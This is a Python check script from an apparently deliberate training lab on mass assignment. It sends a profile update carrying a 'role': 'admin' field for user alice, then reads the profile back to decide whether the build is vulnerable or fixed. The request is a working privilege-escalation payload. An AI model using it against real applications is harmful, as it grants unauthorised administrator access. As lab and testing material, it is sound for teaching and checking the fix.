"""LAB 15 (A06 — Insecure Design): mass assignment / self-promotion to admin.

Exploit: PATCH /api/profile with a `role` field in the body. On the
vulnerable build the whole body is bound onto the user entity, so alice
becomes an admin. On the fixed build only the fields a customer owns are
applied, and the role is untouched.
"""

from common import Client, Result, Verdict

ID = 15
TITLE = "Mass assignment — promote yourself to admin via the profile endpoint"
ENDPOINT = "PATCH /api/profile"
AFFECTED = "backend/src/main/java/com/securebank/labs/a06/ProfileController.java -> update(Map)"


def run(ctx: Client) -> Result:
    token = ctx.token("alice")

    r = ctx.patch(
        "/api/profile",
        token=token,
        json={
            "username": "alice",
            "email": "alice@bank.com",
            "full_name": "Alice Anderson",
            "role": "admin",
        },
    )
    if r.status_code != 200:
        return Result(
            Verdict.INCONCLUSIVE,
            f"the profile endpoint returned HTTP {r.status_code}: {r.text[:200]}",
        )

    # Read the profile back — the persisted role is what matters.
    r = ctx.get("/api/profile", token=token)
    if r.status_code != 200:
        return Result(
            Verdict.INCONCLUSIVE,
            f"could not read the profile back — HTTP {r.status_code}: {r.text[:200]}",
        )
    try:
        body = r.json()
    except ValueError:
        return Result(Verdict.INCONCLUSIVE, f"the profile body is not JSON: {r.text[:200]}")

    role = str(body.get("role", "")).lower()
    if role == "admin":
        return Result(
            Verdict.VULNERABLE,
            "the request body set alice's role to admin — she is now an administrator",
        )

    return Result(
        Verdict.FIXED,
        f"the role field was ignored — alice is still {role or 'unset'}",
    )
